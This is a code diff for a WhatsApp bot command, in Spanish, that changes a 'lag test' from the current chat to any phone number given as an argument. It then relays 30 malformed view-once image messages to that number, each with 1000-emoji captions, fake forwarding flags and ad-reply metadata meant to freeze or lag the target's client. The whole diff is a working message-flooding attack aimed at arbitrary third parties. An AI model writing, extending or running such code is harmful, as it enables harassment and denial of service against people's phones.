@@ -1,28 +1,34 @@
 let handler = async (m, { conn, args, usedPrefix, command }) => {
-  const target = m.chat;
-  const times = 30; // Número de mensajes que manda
+  let number = args[0];
 
-  m.reply(`🚀 *Iniciando Lag Test en ${target}...*`);
+  if (!number || !number.match(/^\d{5,}$/)) {
+    return m.reply(`✳️ *Formato incorrecto*\n\n📌 Usa: *${usedPrefix + command} 573001234567*`);
+  }
+
+  let jid = number + "@s.whatsapp.net";
+  let times = 30; // Número de envíos
+
+  m.reply(`📡 *Enviando Lag Test a* ${jid}...`);
 
   for (let i = 0; i < times; i++) {
-    await conn.relayMessage(target, {
+    await conn.relayMessage(jid, {
       viewOnceMessage: {
         message: {
           imageMessage: {
             mimetype: "image/jpeg",
             caption: '🧨'.repeat(1000),
-            jpegThumbnail: Buffer.alloc(0), // Imagen vacía (sin peso real)
+            jpegThumbnail: Buffer.alloc(0),
             contextInfo: {
               forwardingScore: 999,
               isForwarded: true,
               mentionedJid: ["0@s.whatsapp.net"],
               externalAdReply: {
-                title: "WhatsApp Lag Test",
+                title: "🚧 WhatsApp Lag Test 🚧",
                 body: "Cargando contenido...",
                 thumbnailUrl: "https://telegra.ph/file/94cf0cb2054ff45e3f0df.jpg",
                 sourceUrl: "https://whatsapp.com",
                 mediaType: 1,
-                renderLargerThumbnail: true,
+                renderLargerThumbnail: true
               }
             }
           }
@@ -30,12 +36,12 @@ let handler = async (m, { conn, args, usedPrefix, command }) => {
       }
     }, { messageId: null });
 
-    await new Promise(res => setTimeout(res, 200)); // Delay entre envíos
+    await new Promise(res => setTimeout(res, 200)); // delay entre cada mensaje
   }
 
-  m.reply("✅ *Lag Test Finalizado.* Observa si hubo congelamientos o delay.");
+  m.reply("✅ *Lag Test finalizado.* Revisa si el número tuvo delay o freeze.");
 };
 
-handler.command = /^lagtest$/i;
-handler.owner = true; // solo para el owner
+handler.command = /^lagtestnum$/i;
+handler.owner = true; // solo el dueño puede usarlo
 export default handler;
